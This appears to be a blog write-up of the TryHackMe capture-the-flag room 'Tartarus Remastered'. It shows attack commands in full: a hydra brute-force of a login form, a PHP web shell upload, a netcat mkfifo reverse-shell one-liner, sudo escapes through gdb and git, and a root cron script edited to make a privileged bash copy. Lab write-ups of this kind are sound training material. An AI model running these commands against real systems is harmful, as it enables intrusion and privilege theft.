---
title: "Tartarus_writeup"
date: 2020-10-28T10:10:38-04:00
draft: true
toc: true
featured: true
summary: "Welcome to another writeup, this time we hack Tartarus-Remastered another TryHackMe room. Let's see if we get root during the lunch break at work XD"
images:
  - "img/tartarus_cover.jpg"
cover: "img/tartarus_cover.gif"
tags:
  - hacking
  - tryHackme
  - writeups
  - tartarus
---

# Tartarus-Remastered TryHackMe Room

Welcome back! Today I have another writeup. This time I went for a just-released room on TryHackMe called `Tartarus Remastered`. I hope you enjoy it!


- Please visit This room on TryHackMe by [clicking this link](https://tryhackme.com/room/gamingserver).
- **PLEASE NOTE:** Passwords, flag values, or any kind of answers to the room questions were intentionally masked as required by THM writeups rules. 


## Getting Started

I'll be using once again `autorecon <IP>` to scan this box. So leave that running or perform manual scans if you'd like. I'm going through this room on my lunch break at work so don't have much time XD.


## Checking Autorecon Results and gaining access.

If we look at Gobuster's results, we see a `robots.txt` file that we can access:

![](https://i.imgur.com/8tlOnnV.png)

If we look at that directory in `disallowed` entry:

![](https://i.imgur.com/k8M3EWs.png)


If we look at the FTP (nmap scan shows anonymous login is enabled), we can see something interesting:

![](https://i.imgur.com/yMT7CDr.png)

There are directories named `...` that we can access and inside there is a file.

If we check that file we see another directory is mentioned:

![](https://i.imgur.com/aD9j2RN.png)

We get a login form. This is getting quite familiar, we can try the same we did for the room called `Hydra`. Check that [here](https://www.tzero86bits.tk/posts/hydra_writeup/).

We need to construct a POST request attack with hydra. 

/sUp3r-s3cr3t

`hydra -l userid -P credentials.txt 10.10.61.206 http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:F=Incorrect" -V -F -u`

![](https://i.imgur.com/eYR3wxO.png)



We can also let gobuster now we have a new directory that it can explore:

```sh
gobuster dir --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.61.206/sUp3r-s3cr3t/ -x php,txt,html,sh,cgi
```

![](https://i.imgur.com/guZOPm4.png)

If we brute-force the login request we get the following:

![](https://i.imgur.com/DJnKg3T.png)

And if we login we get an upload form:

![](https://i.imgur.com/HqND3cF.png)

We can try to upload a semi-interactive php-bash and see if we can access that:

![](https://i.imgur.com/Ma8sKV5.png)

Now if we navigate back to that `images/uploads/` folder, we see our file is there:

![](https://i.imgur.com/ukMGnE0.png)

If we go ahead and click on that file we get our PHP-Bash working:

![](https://i.imgur.com/ytecqGV.png)

If we navigate to the home folder, we can access `d4rckh` folder and cat out the user flag:

![](https://i.imgur.com/ia7SGaw.png)

Ok so now we need to go get the root flag. Even though the semi-interactive shell we got is fine. I would like to have better access from my own terminal so let's try to get a reverse shell.

We start a `nc -nlvp 2112` in our terminal and then we try to fire a connection in the php-bash file back to our machine:

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.0.34 2112 >/tmp/f`


Now that we have a reverse shell, we can navigate a bit more comfortable. If we take a look at the other folder at the home directory we see another file that mentions `git`.

![](https://i.imgur.com/vCfgrjw.png)

If we run a `sudo -l` we see that the user we have can run `gdb` as sudo. Let's check GTFObins to see if we have a way of exploiting that.

It seems there is a way to get a reverse shell, lets try that:

![](https://i.imgur.com/Bxp6Jwb.png)

Maybe I'm doing something wrong but `gdb` did not work and I still was `www-data` user after trying all the options listed on GTFbins. Let's check if we have any running cron jobs:

![](https://i.imgur.com/mBQUZT2.png)

Indeed we have and, it is a file I saw inside `d4rckh`'s folder. Since that cron job is running as root, we can try to edit it so when it runs it spaws a privileged shell back to us.

But first we really need to get gdb working so we can switch user. The idea here is to impersonate the other user `thirtytwo` and see what he can run as sudo, and if we recall the file we found earlier we know that `d4rckh` fixed the access to git for him. So we can assume `thirtytwo` could have privileged access to git executable.

After checking a while on that gdb binary, it seems we can try it as follows:

`sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex qu`

That seems to work and we are now the expected user which, as we thougth has access to git.

![](https://i.imgur.com/whF3tz3.png)

Let's check back on GTFObins if we have anything on git to get root.

We can try to run `python -c 'import pty;pty.spawn("/bin/bash");'` to get a TTY shell before we try to get root.

NOTE: also run `export TERM=xterm` to get a more responsive terminal that for instance is able to `clear` the screen.

Now let's try some of the commands suggested by GTFObins. If we check the `Sudo` section we get a few to try. The first one does not work at all in this case. Let's check the second:

`sudo git -p help config` and `!/bin/sh`

Still we need to adjust the command a bit, we need to explicitly set the user we want to switch to:

`sudo -u d4rckh git -p help config`

That seems to work and we are now the user `d4rckh`

![](https://i.imgur.com/Vh8mDXQ.png)

Ok now let's check that `cleanup.py` file that's running as a cron job. And see if we can edit it to get us root.

> NOTE: To make sure I don't lose the original file, I ran `cp cleanup.py cleanup.py.bak`

Now let's see if we can edit the file with nano:

Even though we got an error before nano opens, we are able to edit the file. We make the changes to the command being executed so it creates a copy of `bash` with privileges that we can execute later in one of our accessible directories:

![](https://i.imgur.com/sQ9FYjp.png)

We save the file and we just wait, since the file is tied to a cronjob we need to wait for it to get executed:


If you notice the command tells the system to copy bash into a `tmp/rootbash` folder. 

> NOTE: Credits to @ratiros01 on that command, I was just failing at making that work until I came across his idea for that in one of his posts.

Let's navigate to that temp folder and see if we get our bash copied. We do, it worked. Now we need to run that file, however we need to make use of the switch `-p` so the binary would not drop his privileges. Otherwise it would run with the permissions our current user has.

![](https://i.imgur.com/LtTBQvp.png)

It worked great and we are now root!, let's grab that flag and complete the room.


![](https://i.imgur.com/eXiuc6f.png)

I hope you enjoyed this room as much as I did, thanks again to @ratiros01 for his post that helped me when I got stuck.


Happy hacking and thanks for stopping by!

{{< thm_badge >}}



